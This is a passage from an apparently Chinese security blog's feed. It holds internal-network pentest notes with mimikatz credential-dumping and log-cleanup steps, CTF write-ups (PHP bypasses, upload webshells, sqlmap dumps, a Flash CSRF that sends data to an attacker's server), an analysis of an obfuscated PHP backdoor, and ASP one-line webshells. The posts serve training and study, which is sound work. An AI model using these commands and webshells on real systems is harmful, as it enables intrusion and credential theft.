/svc</p><p>tasklist /S ip /U domain\username /P /V 查看远程计算机 tasklist</p><p>net localgroup administrators &amp;&amp; whoami 查看当前是不是属于管理组</p><p>netstat -ano</p><p>nltest /dclist:xx  查看域控</p><p>whoami /all 查看 Mandatory Label uac 级别和 sid 号</p><p>net sessoin 查看远程连接 session (需要管理权限)</p><p>net share     共享目录</p><p>cmdkey /l   查看保存登陆凭证</p><p>echo %logonserver%  查看登陆域</p><p>spn –l administrator spn 记录</p><p>set  环境变量</p><p>dsquery server - 查找目录中的 AD DC/LDS 实例</p><p>dsquery user - 查找目录中的用户</p><p>dsquery computer 查询所有计算机名称 windows 2003</p><p>dir /s *.exe 查找指定目录下及子目录下没隐藏文件</p><p>arp -a</p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>Windows密码 //收集管理员信息</p><p>mimikatz.exe </p><p>privilege::debug</p><p>sekurlsa::logonpasswords</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201806221754_957.png" alt=""></p><p>破解lm密码使用：<a href="http://www/object_security.ch/en/opcrack.php" target="_blank" rel="external">http://www/object_security.ch/en/opcrack.php</a></p><p> token::elevate</p><p> lsadump::sam</p><p> lsadump::secrets </p><p>exit </p><p> wifi 密码： </p><p>• Mysql等数据库密码 </p><p>• 浏览器保存密码</p><p> • 浏览器历史记录</p><p> • 远程桌面历史记录</p><p> • 查找文件</p><p> • 键盘记录</p><p>keyscan_start</p><p>keyscan_dump</p><p> • 中间人</p><h2 id="0x03-横向移动"><a href="#0x03-横向移动" class="headerlink" title="0x03 横向移动"></a>0x03 横向移动</h2><p> • 端口扫描</p><p> • 命令执行</p><p> • SQL注入</p><p> • 文件上传 </p><p>• 密码爆破</p><p> • 各类CVE </p><h2 id="0x04-收尾工程"><a href="#0x04-收尾工程" class="headerlink" title="0x04 收尾工程"></a>0x04 收尾工程</h2><p>痕迹清理 </p><p>系统日志 //%systemroot%system32configSecEvent.EVT<br>• 应用程序日志 //%systemroot%system32configAppEvent.EVT<br>• FTP日志 //%systemroot%system32logfilesmsftpsvc1<br>• WWW日志 //%systemroot%system32logfilesw3svc1</p><p>参考文章</p><p><a href="http://www.freebuf.com/articles/web/170970.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/170970.html</a></p><p><a href="https://mp.weixin.qq.com/s/U2MqcjA_YmMlajJzvDCZZw" target="_blank" rel="external">https://mp.weixin.qq.com/s/U2MqcjA_YmMlajJzvDCZZw</a></p><p><a href="https://www.anquanke.com/post/id/92646" target="_blank" rel="external">https://www.anquanke.com/post/id/92646</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;浅谈内网渗透流程&quot;&gt;&lt;a href=&quot;#浅谈内网渗透流程&quot; class=&quot;headerlink&quot; title=&quot;浅谈内网渗透流程&quot;&gt;&lt;/a&gt;浅谈内网渗透流程&lt;/h1&gt;&lt;h2 id=&quot;0x01-内网转发&quot;&gt;&lt;a href=&quot;#0x01-内网转发&quot; class=&quot;he
      
    
    </summary>
    
      <category term="内网渗透" scheme="http://mang0.me/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="内网" scheme="http://mang0.me/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>安恒5月</title>
    <link href="http://mang0.me/archives/18042369/"/>
    <id>http://mang0.me/archives/18042369/</id>
    <published>2018-08-25T12:40:51.000Z</published>
    <updated>2018-11-02T13:52:17.098Z</updated>
    
    <content type="html"><![CDATA[<h2 id="奇怪的恐龙特性"><a href="#奇怪的恐龙特性" class="headerlink" title="奇怪的恐龙特性"></a>奇怪的恐龙特性</h2><p>题目</p><pre><code>大约在15亿年前，生活在地球上的恐龙中有一种很奇怪的恐龙，他们有一种奇怪的特性，那就是当在捕杀猎物的时候，如果猎物发出惊讶的表情的时候，他们也会发出惊讶的表情来告诉猎物“你们快要死了”，然而这种特性并没什么用处。。。因为我编不下去了。。以上这个故事是我瞎编的。。。</code></pre><p>题目给了代码</p><pre><code>&lt;?php highlight_file(__FILE__); ini_set(&quot;display_error&quot;, false);  error_reporting(0);  $str = isset($_GET[&#39;A_A&#39;])?$_GET[&#39;A_A&#39;]:&#39;A_A&#39;; if (strpos($_SERVER[&#39;QUERY_STRING&#39;], &quot;A_A&quot;) !==false) {     echo &#39;A_A,have fun&#39;; } elseif ($str&lt;9999999999) {     echo &#39;A_A,too small&#39;; } elseif ((string)$str&gt;0) {     echo &#39;A_A,too big&#39;; } else{     echo file_get_contents(&#39;flag.php&#39;); } ?&gt;</code></pre><p>首先第一个if判断，可以用<code>urlencode</code>绕过</p><p>然后我们需要知道php中的这样一个特性</p><pre><code>php &gt; var_dump([]&gt;9999999999);bool(true)php &gt; var_dump((string)[]&gt;0);bool(false)</code></pre><p>在php中，数组<code>[]</code>大于任何一个数</p><p>这样就可以成功绕过验证了</p><p><code>php -r &quot;var_dump([]&gt;233333333);&quot;</code></p><p>true</p><p><a href="http://101.71.29.5:10007/?A+A[]=admin" target="_blank" rel="external">http://101.71.29.5:10007/?A+A[]=admin</a></p><p>这里有个坑，flag被注释了，需要查看源代码才能看得到flag</p><pre><code>flag={09bc24026c987ae44a6e424479b2e3}</code></pre><h2 id="Mynote"><a href="#Mynote" class="headerlink" title="Mynote"></a>Mynote</h2><p>这道题目一开始我死扣xss发现无路可循后面经别人小小提醒之后，原来是个炒鸡弱智的反序列化题目，不多说<br>上图，在<code>robots.txt</code>里面发现几个可疑的页面，可能有用先记录着，直接访问<code>flag.php</code>是个假的flag。</p><p>经过别人的提示，是反序列化以后，多抓几个包看一下  在<code>upload页面</code>上传图片文件，然后返回查看图片的页面发现里面多了一个关于<code>picture</code>参数的<code>cookie</code> </p><p>解码发现是个<code>json格式</code>的东西 </p><p>这就跟反序列化联系起来了，这是一个数组类型的反序列化但直接反序列化会有报错，如下<br><img src="https://s1.ax1x.com/2018/06/23/P9MK5F.png" alt="P9MK5F.png"><br>发现是在当前目录用的函数读取页面，于是就要目录穿越一波，于是便有了下面的操作</p><pre><code class="php">&lt;?php $a[] = &#39;../../controllers/Basecontrol.php&#39;; $b[] = &#39;../../flag.php&#39;; $c[] = &#39;../../controllers/User.php&#39;; $d[] = &#39;../../controllers/Controllers.php.php&#39;;echo urlencode(base64_encode(serialize($a)));12345678</code></pre><p>把他们一个个弄到<code>picture</code>的<code>cookie</code>里面，把回显出来的<code>base64编码</code>一遍遍解码，得到源码，起初一直以为后续还要代码审计。。。结果解码flag.php的源码的时候出现了真的<code>flag</code>。。。。。尼玛坑爹，都做好审计准备了</p><pre><code class="php">&lt;?php$flag = &quot;flag{N4me_sPac4_Is_Int3r3st1ng}&quot;;echo &quot;flag{This_1S_A_F4ke_f1aG}&quot;;1234</code></pre><h2 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload"></a>ezupload</h2><p>本题是一个中规中矩的文件上传漏洞.</p><p>打开题目链接，我们先上传一个图片文件.上传成功，回显图片的路径.</p><p>继续上传一个php文件，便发现提示It is not a image,上传失败.</p><p>我们抓包分析一下，修改Content-Type: image/jpeg，和文件后缀，还是不能上传php文件.</p><p>想到还有一种检测文件的方法，那就是文件头标志.</p><p>于是我上传了一个图片木马，即php木马隐藏在图片中,抓包，修改文件后缀名,上传成功，但是文件后缀名被改为peg</p><p>经过一番测试，发现它是自动将文件的三位后缀名替换为peg. 我们将文件名改成mu.jpg.php,上传成功，网站打开发现，mu.peg.php 解析成功. 这考虑的是apache的特性 从后往前识别</p><h2 id=""><a href="#" class="headerlink" title=" "></a> </h2><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808211643_505.png" alt=""></p><p>连接菜刀，拿到flag.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;奇怪的恐龙特性&quot;&gt;&lt;a href=&quot;#奇怪的恐龙特性&quot; class=&quot;headerlink&quot; title=&quot;奇怪的恐龙特性&quot;&gt;&lt;/a&gt;奇怪的恐龙特性&lt;/h2&gt;&lt;p&gt;题目&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;大约在15亿年前，生活在地球上的恐龙中有一种很奇怪的恐龙，他们有
      
    
    </summary>
    
      <category term="CTF" scheme="http://mang0.me/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://mang0.me/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>安恒7月</title>
    <link href="http://mang0.me/archives/b20debe2/"/>
    <id>http://mang0.me/archives/b20debe2/</id>
    <published>2018-08-25T12:39:36.000Z</published>
    <updated>2018-11-02T13:52:17.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="安恒杯7月"><a href="#安恒杯7月" class="headerlink" title="安恒杯7月"></a>安恒杯7月</h1><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="0x00-order"><a href="#0x00-order" class="headerlink" title="0x00 order"></a>0x00 order</h3><p>提示</p><p>1.右键提示 从flag表中得到flag</p><p>2.order注入</p><p>只对某一参数注入</p><p>sqlmap -u “<a href="http://101.71.29.5:10000/?order=id&amp;button=submit”" target="_blank" rel="external">http://101.71.29.5:10000/?order=id&amp;button=submit”</a> -p order</p><p>sqlmap -u “<a href="http://101.71.29.5:10000/?order=id&amp;button=submit”" target="_blank" rel="external">http://101.71.29.5:10000/?order=id&amp;button=submit”</a> -p order –dbs</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201807261044_138.png" alt=""></p><p>sqlmap -u “<a href="http://101.71.29.5:10000/?order=id&amp;button=submit”" target="_blank" rel="external">http://101.71.29.5:10000/?order=id&amp;button=submit”</a> -p order –dbs –dump-all –thread 10</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201807261613_856.png" alt=""></p><p>flag{666_0rdorby_you_can}</p><h3 id="0x01-就这么直接"><a href="#0x01-就这么直接" class="headerlink" title="0x01 就这么直接"></a>0x01 就这么直接</h3><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201807221514_920.png" alt=""></p><p>提交查询页面跳转到 我觉得这并不是答案</p><p>右键源码得到 hint.php</p><p>访问得到代码</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201807211925_710.png" alt=""></p><p>分析：</p><p>1.访问页面的时间戳作为播种时间 </p><p>2.输出md5</p><p>php -r “echo md5(time());”</p><p>随机抽取一个md5的值输入进去</p><p>php -r “echo md(time());”</p><p>返回 答案错误</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201807211928_659.png" alt=""></p><pre><code class="python">import requestsimport reimport ioimport sysurl=&quot;http:&quot;s=requests.Session()p=s.get(url)s.encoding = &#39;utf-8&#39;payload={&#39;answer&#39;:&#39;c4ca4238a0b923820dcc509a6f75849b&#39;}q=s.post(url,data=payload)html=q.contenthtml_doc=str(html,&#39;utf-8&#39;)payload={&#39;answer&#39;:html_doc[160:192]}#返回的md5值q=s.post(url,data=payload)html=q.contenthtml_doc=str(html,&#39;utf-8&#39;)print(html_doc)</code></pre><p>flag{ef58f0b1e9437b4451248fb3f239622b}</p><h3 id="0x02简历来了"><a href="#0x02简历来了" class="headerlink" title="0x02简历来了"></a>0x02简历来了</h3><p>当时没做出来 再次复现的</p><p>题目的知识点：</p><p>1、csrf的原理</p><p>2、swf的文件头flash的检查</p><p>cws fws zws</p><h4 id="解析："><a href="#解析：" class="headerlink" title="解析："></a>解析：</h4><p>上传简历</p><p>php代码审计：</p><p>直接提交访问</p><pre><code class="php">&lt;?phprequire_once(&#39;init.php&#39;);header(&quot;Content-type: text/html; charset=utf-8&quot;);if(isset($_POST[&#39;submit&#39;])){    if(!z_validate_captcha()){        die(&#39;验证码错误&#39;);    }    $email = isset($_POST[&#39;email&#39;])?trim($_POST[&#39;email&#39;]):&#39;&#39;;    $url = isset($_POST[&#39;url&#39;])?trim($_POST[&#39;url&#39;]):&#39;&#39;;    $file = isset($_FILES[&#39;file&#39;])?$_FILES[&#39;file&#39;]:false;    if($email == false || $url == false || $file == false){        die(&#39;Invalid Input&#39;);    }    if(!filter_var($email, FILTER_VALIDATE_EMAIL)){        die(&#39;Invalid Email&#39;);    }    if(!filter_var($url, FILTER_VALIDATE_URL) || (strpos($url, &#39;http://&#39;) !== 0 &amp;&amp; strpos($url, &#39;https://&#39;) !== 0)){        die(&#39;Invalid URL&#39;);    }    if($file[&#39;error&#39;] || $file[&#39;size&#39;] &gt; 1024*1024 || !is_uploaded_file($file[&#39;tmp_name&#39;])){        die(&#39;Invalid File&#39;);    }    $ext = getExt($file[&#39;name&#39;]);    if(!in_array($ext, array(&#39;.jpg&#39;,&#39;.jpeg&#39;, &#39;.png&#39;, &#39;.docx&#39;, &#39;.doc&#39;))){        die(&#39;Invalid File Type&#39;);    }    $file_checked = false;    if(in_array($ext, array(&#39;.jpg&#39;,&#39;.jpeg&#39;, &#39;.png&#39;))){        $finfo = finfo_open(FILEINFO_MIME);        if (!$finfo) {            die(&quot;Opening fileinfo database failed&quot;);        }        $mime = finfo_file($finfo, $file[&quot;tmp_name&quot;]);        finfo_close($finfo);        if($mime == false){            die(&#39;Invalid Filename&#39;);        }        $arr = explode(&#39;;&#39;, $mime);        $mime = $arr[0];        if($mime == false || !in_array($mime, array(&#39;image/gif&#39;, &#39;image/jpeg&#39;, &#39;image/jpg&#39;, &#39;image/png&#39;, &#39;application/octet-stream&#39;))){            die(&#39;Invalid Filename&#39;);        }else{            $file_checked = true;        }    }elseif(in_array($ext, array(&#39;.docx&#39;, &#39;.doc&#39;))){        $finfo = finfo_open(FILEINFO_MIME);        if (!$finfo) {            die(&quot;Opening fileinfo database failed&quot;);        }        $mime = finfo_file($finfo, $file[&quot;tmp_name&quot;]);        finfo_close($finfo);        if($mime == false){            die(&#39;Invalid Filename&#39;);        }        $arr = explode(&#39;;&#39;, $mime);        $mime = $arr[0];        if($mime == false || !in_array($mime, array(&#39;application/msword&#39;,&#39;application/word&#39;, &#39;application/vnd.openxmlformats-officedocument.wordprocessingml.document&#39;))){            die(&#39;Invalid Filename&#39;);        }else{            $file_checked = true;        }    }    if($file_checked !== true){        die(&#39;Invalid File Type&#39;);    }    $filename = &#39;./upload/&#39;.md5(mt_rand().microtime()).$ext;    move_uploaded_file($file[&quot;tmp_name&quot;], $filename);    if(!file_exists($filename)){        echo &#39;上传失败&#39;;    }else{        save_resume($email, $url, $filename);        echo &quot;&lt;br/&gt;提交成功：&quot;;        echo &quot;&lt;br/&gt;邮箱：&quot;.htmlspecialchars($email);        echo &quot;&lt;br/&gt;个人网站：&quot;.htmlspecialchars($url);        echo &quot;&lt;br/&gt;简历地址：&quot;.htmlspecialchars($filename);        echo &quot;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&quot;;    }}show_source(__FILE__);</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201807271711_417.png" alt=""></p><p><a href="http://101.71.29.5:10001/admin/index.php" target="_blank" rel="external">http://101.71.29.5:10001/admin/index.php</a></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201807271711_670.png" alt=""></p><p>考虑知识点csrf 我们要模拟管理员去访问</p><h6 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h6><p><a href="http://www.freebuf.com/articles/web/35353.html" target="_blank" rel="external">Flash跨域数据劫持漏洞，一大波网站受影响</a><br><strong>object标签在包含flash文件时没有对嵌入的文件后缀进行判断。也就是说，只要文件内容包含了正常的flash文件代码，就能够被object标签成功加载并执行。</strong></p><p>flash文件有三种文件头：CWS FWS ZWS【最新的】<br>由于ZWS是新兴的文件格式，PHP暂不支持。</p><p>在php中，当解析cws,fws格式的文件的时候，会解析成 application/x-shockwave-flash;<br>但是当解析 zws 格式的文件时候，会解析成 application/octet-stream<br>从而绕过MIME限制。</p><p><strong>目录扫描发现<a href="http://101.71.29.5:10001/admin/中需要管理员权限才能看到flag。我们已知后台的爬虫会带着管理员的session_id来打开flag的页面，当后台的爬虫打开这个图像的时候。会跳转到我们的服务器地址，与此同时会加载object标签内嵌的flash，flash会利用CSRF打开http://101.71.29.5:10001/admin/将flag打回我们的服务器。" target="_blank" rel="external">http://101.71.29.5:10001/admin/中需要管理员权限才能看到flag。我们已知后台的爬虫会带着管理员的session_id来打开flag的页面，当后台的爬虫打开这个图像的时候。会跳转到我们的服务器地址，与此同时会加载object标签内嵌的flash，flash会利用CSRF打开http://101.71.29.5:10001/admin/将flag打回我们的服务器。</a></strong></p><h6 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h6><p><strong>其实这道题原理是最重要的，复现的话利用的是别人写的东西，没有什么太大意义。</strong></p><p>下载项目中的文件，将<code>ContentHijacking.swf</code>文件头改为ZWS然后后缀改为jpg上传到服务器，记录文件路径。<strong>(windows编辑器改的文件不能复现成功，某表哥说他windows上我软件全试过，没用。只有mac的hex friend可以，这就很奇怪了。)</strong></p><p>然后在<code>ContentHijackingLoader.html</code>125行加上你vps的地址，保存传到你的vps上。<br><a href="https://upload-images.jianshu.io/upload_images/9113969-bc47b3e7e188f0de.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" target="_blank" rel="external"><img src="https://upload-images.jianshu.io/upload_images/9113969-bc47b3e7e188f0de.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></a></p><p>在你的vps上打开<code>ContentHijackingLoader.html</code>，第一个填写开始时候上传的jpg文件地址，下面填写要攻击的URL地址。然后生成payload。<br><a href="https://upload-images.jianshu.io/upload_images/9113969-a9a778bfc1351f30.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" target="_blank" rel="external"><img src="https://upload-images.jianshu.io/upload_images/9113969-a9a778bfc1351f30.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></a></p><p>把payload写进个人网站提交，后台爬虫会访问这个payload。然后在你的vps日志里面就能看到打回来的<a href="http://101.71.29.5:10001/admin/%E4%B8%AD%E7%9A%84flag%E3%80%82" target="_blank" rel="external">http://101.71.29.5:10001/admin/中的flag。</a><br><a href="https://upload-images.jianshu.io/upload_images/9113969-becf6d50182c16e5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" target="_blank" rel="external"><img src="https://upload-images.jianshu.io/upload_images/9113969-becf6d50182c16e5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></a></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="0x00-F5刷新"><a href="#0x00-F5刷新" class="headerlink" title="0x00 F5刷新"></a>0x00 F5刷新</h3><p>拿到一个图片一闪而过</p><p>根据提示想到F5刷新隐写</p><pre><code>首先下载F5解密的代码：https://github.com/matthewgao/F5-steganography切换到改目录下：cd F5-steganography继续运行命令：java Extract  E:\CTF\安恒月赛7\5b51807ba55b4\Misc.jpg然后会生成output.txt文件</code></pre><p>有密码</p><p>使用zipcenop打开看看可以解密</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201807261455_536.png" alt=""></p><p>伪加密</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201807261455_593.png" alt=""></p><p>实际上修改把01改成00就可</p><p>flag{96efd0a2037d06f34199e921079778ee}</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201807242216_34.png" alt=""></p><h3 id="0x01-弱口令"><a href="#0x01-弱口令" class="headerlink" title="0x01 弱口令"></a>0x01 弱口令</h3><p>…. . .-.. .-.. —– ..-. — .-. ..- – </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201807261343_275.png" alt=""></p><p>… . .-.. .-.. —– ..-. — .-. ..- —</p><p><a href="http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx" target="_blank" rel="external">http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx</a></p><p>HELL0FORUM</p><p>图片拿出来 stegsolve感觉可能是lsb隐写</p><pre><code>python lsb.py extract 女神.png  1.txt 123456</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;安恒杯7月&quot;&gt;&lt;a href=&quot;#安恒杯7月&quot; class=&quot;headerlink&quot; title=&quot;安恒杯7月&quot;&gt;&lt;/a&gt;安恒杯7月&lt;/h1&gt;&lt;h2 id=&quot;WEB&quot;&gt;&lt;a href=&quot;#WEB&quot; class=&quot;headerlink&quot; title=&quot;WEB&quot;&gt;&lt;/
      
    
    </summary>
    
      <category term="CTF" scheme="http://mang0.me/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://mang0.me/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>墨者学院php代码审计1</title>
    <link href="http://mang0.me/archives/8395d5c7/"/>
    <id>http://mang0.me/archives/8395d5c7/</id>
    <published>2018-08-25T12:32:48.000Z</published>
    <updated>2018-11-02T13:52:16.550Z</updated>
    
    <content type="html"><![CDATA[<h2 id="PHP代码分析溯源-第1题"><a href="#PHP代码分析溯源-第1题" class="headerlink" title="PHP代码分析溯源(第1题)"></a>PHP代码分析溯源(第1题)</h2><h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>某日，在某公司做IT维护的朋友给安全工程师”墨者”发了一个PHP文件，说在其WEB服务器发现多了一个b.php文件，目前不确定这个文件是开发留下的正常文件还是攻击者上传的木马后门，希望”墨者”能够帮他分析一下。 </p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>访问<a href="http://219.153.49.228:45070/" target="_blank" rel="external">http://219.153.49.228:45070/</a></p><pre><code class="php">&lt;?php @$_++;$__=(&quot;`&quot;^&quot;?&quot;).(&quot;:&quot;^&quot;}&quot;).(&quot;%&quot;^&quot;`&quot;).(&quot;{&quot;^&quot;/&quot;);$___=(&quot;$&quot;^&quot;{&quot;).(&quot;~&quot;^&quot;.&quot;).(&quot;/&quot;^&quot;`&quot;).(&quot;-&quot;^&quot;~&quot;).(&quot;(&quot;^&quot;|&quot;);${$__}[!$_](${$___}[$_]); ?&gt;</code></pre><p>运行下，报错。 </p><p>$_ =&gt; 1</p><p>$__ =&gt; _GET</p><p>$___ =&gt; _POST</p><p>然后观察最后一行代码，把我们变量给用值替换进去</p><pre><code>${_GET}[!1](${_POST}[1]);</code></pre><p>把多余的{}去掉 [!1]也就是[0]，整理下代码是这样的</p><pre><code>$_GET[0]($_POST[1]);</code></pre><p>和一句话的</p><pre><code>$_POST[1]</code></pre><p>传参差不多了，那么</p><pre><code>$_GET[0]</code></pre><p>就是我们的函数名了</p><p>根据”b.php源码”提示去b.php目录下</p><p>用hackbar传GET和POST请求</p><p><a href="http://219.153.49.228:45070/b.php?0=assert" target="_blank" rel="external">http://219.153.49.228:45070/b.php?0=assert</a></p><p>1=phpinfo()</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201807221443_103.png" alt=""></p><p>在菜刀里写<a href="http://219.153.49.228:45070/b.php?0=assert密码是1" target="_blank" rel="external">http://219.153.49.228:45070/b.php?0=assert密码是1</a></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201807221450_724.png" alt=""></p><h3 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h3><p>这里有一个问题在于</p><p><a href="http://219.153.49.228:45070/b.php?0=eval" target="_blank" rel="external">http://219.153.49.228:45070/b.php?0=eval</a></p><p>无法显示phpinfo</p><p>这里延伸出一个问题<a href="https://www.cnblogs.com/iamstudy/articles/analysis_eval_and_assert.html" target="_blank" rel="external">柠檬大大的文章</a>解释的很好</p><p>问题出在</p><p><code>$_POST[&#39;1&#39;]()</code>这是一个<a href="http://php.net/manual/zh/functions.variable-functions.php" target="_blank" rel="external">可变函数</a>,这意味着如果一个变量名后有圆括号，PHP 将寻找与变量的值同名的函数，并且尝试执行它。可变函数可以用来实现包括<strong>回调函数</strong>，函数表在内的一些用途。 </p><p>但是eval不能被可变函数 调用。 </p><blockquote><p><a href="http://php.net/manual/zh/language.pseudo-types.php#language.types.mixed" target="_blank" rel="external">mixed</a> <strong>eval</strong> ( string <code>$code</code> ) </p><p><strong>Note</strong>: 因为是一个语言构造器而不是一个函数，不能被 <a href="http://php.net/manual/zh/functions.variable-functions.php" target="_blank" rel="external">可变函数</a> 调用。 </p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;PHP代码分析溯源-第1题&quot;&gt;&lt;a href=&quot;#PHP代码分析溯源-第1题&quot; class=&quot;headerlink&quot; title=&quot;PHP代码分析溯源(第1题)&quot;&gt;&lt;/a&gt;PHP代码分析溯源(第1题)&lt;/h2&gt;&lt;h3 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; c
      
    
    </summary>
    
      <category term="代码审计" scheme="http://mang0.me/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="代码审计" scheme="http://mang0.me/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>PHP字符串&#39;和“区别</title>
    <link href="http://mang0.me/archives/d8be4236/"/>
    <id>http://mang0.me/archives/d8be4236/</id>
    <published>2018-08-25T12:22:01.000Z</published>
    <updated>2018-11-02T13:52:14.751Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PHP字符串’和“区别"><a href="#PHP字符串’和“区别" class="headerlink" title="PHP字符串’和“区别"></a>PHP字符串’和“区别</h1><p>在PHP语言里，如果一个字符串是用单引号做定义的，</p><p>比如： <code>&#39;$demo&#39;</code>，那么不管这个字符串中间有什么，php都会原样输出。 而如果一个字符串用双引号做定义，那么，php在输出结果之前，先扫描这个字符串，如果遇到 <code>$</code>为开头的，会认为这是个变量，并尝试将 变量 的 值 替换这个变量后，输出。 </p><p>举例如下：      </p><pre><code>&lt;?php$mang0 = &#39;123&#39;;$demo =&quot;&lt;p&gt;ctf&lt;/p&gt; &lt;p&gt;$mang0&lt;/p&gt;&quot;;echo $demo;?&gt;</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808252008_139.png" alt=""></p><p>遇到 <code>$mang0</code>为开头，寻找变量带入输出。</p><pre><code class="php">&lt;?php$mang0 = &#39;123&#39;;$demo =&#39;&lt;p&gt;ctf&lt;/p&gt; &lt;p&gt;$mang0&lt;/p&gt;&#39;;echo $demo;?&gt;</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808252012_584.png" alt=""> </p><p>直接输出</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;PHP字符串’和“区别&quot;&gt;&lt;a href=&quot;#PHP字符串’和“区别&quot; class=&quot;headerlink&quot; title=&quot;PHP字符串’和“区别&quot;&gt;&lt;/a&gt;PHP字符串’和“区别&lt;/h1&gt;&lt;p&gt;在PHP语言里，如果一个字符串是用单引号做定义的，&lt;/p&gt;
&lt;p&gt;比
      
    
    </summary>
    
      <category term="代码审计" scheme="http://mang0.me/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="代码审计" scheme="http://mang0.me/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试基础</title>
    <link href="http://mang0.me/archives/35d3b1d4/"/>
    <id>http://mang0.me/archives/35d3b1d4/</id>
    <published>2018-08-01T15:43:32.000Z</published>
    <updated>2018-10-15T00:40:51.606Z</updated>
    
    <content type="html"><![CDATA[<h1 id="渗透测试基础"><a href="#渗透测试基础" class="headerlink" title="渗透测试基础"></a>渗透测试基础</h1><h2 id="0x00熟悉各类名词"><a href="#0x00熟悉各类名词" class="headerlink" title="0x00熟悉各类名词"></a>0x00熟悉各类名词</h2><p>黑客：Hacker 黑客所做的不是恶意破坏，他们是一群纵横网络上的技术人员，热衷与科技探索、计算机科学研究。在IT圈中，Hacker一词无疑是带有正面意义的。<br>骇客：Cracker 骇客未必具有很高的技术，通常用一些简单的手段去达到一些炫耀、恶作剧、搞破坏的目的。<br>红客：Honcker Honcker用自己的技术维护国内网络安全，并对外来的一切进攻进行还击。他们拥有爱国、正义、进取的精神，是网络安全时代的英雄的代表。</p><p>白帽： 专门研究或者从事网络安全行业的人，通常受雇于各大安全公司，是提高网络、系统安全水平的主要力量。</p><p>黑帽： 专门研究木马、操作系统，寻找漏洞，并且以个人意志为出发点，攻击网络或者计算机。<br>灰帽： 以个人意志为出发点，两者皆可做。</p><h2 id="0x01术语词汇"><a href="#0x01术语词汇" class="headerlink" title="0x01术语词汇"></a>0x01术语词汇</h2><p>脚本(asp、php、jsp)<br>html(css、js、html)<br>HTTP协议<br>CMS(B/S)<br>MD5<br>肉鸡： 被黑客入侵并长期驻扎的计算机或服务器。<br>抓鸡： 利用使用量大的程序的漏洞，使用自动化方式获取。<br>Webshell： 通过Web入侵的一种脚本工具，可以据此对网站服务进行一定程度的控制。<br>漏洞: 硬件、软件、协议等等的可利用安全缺陷，可能被攻击者利用，对数据进行篡改，控制等。</p><p>一句话木马： 通过向服务器端提交一句简短的代码，配合本地客户端实现webshell功能的木马。</p><p>&lt;%eval request(&quot;pass&quot;)%&gt;<br>&lt;%execute(request(&quot;pass&quot;))%&gt;<br>request(“pass”)：接收客户端提交的数据。pass为执行命令的参数。<br>eval/execute：函数执行客户端命令的内容。<br>提权： 操作系统低权限的账户将自己提升为管理员权限使用的方法。</p><p>后门： 黑客为了对住基金向长期的控制，在机器上种植的一段程序或者留下的一个“入口”。</p><p>跳板： 使用肉鸡IP来实施攻击其他目标，以便更好地隐藏自己的身份信息。</p><p>旁站入侵： 